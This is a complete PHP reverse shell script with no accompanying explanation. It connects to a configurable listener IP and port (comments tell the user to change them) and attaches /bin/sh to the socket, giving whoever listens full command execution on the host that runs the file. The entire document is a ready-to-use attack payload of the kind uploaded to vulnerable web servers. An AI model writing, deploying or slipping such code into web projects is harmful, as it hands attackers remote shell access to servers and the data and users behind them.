----------------------------
<?php
$ip = '192.168.10.107'; // Change this to your listening IP
$port = 1234; // Change this to your listening port
$sock = fsockopen($ip, $port);
$proc = proc_open('/bin/sh', array(0 => $sock, 1 => $sock, 2 => $sock), $pipes);
?>
-----------------
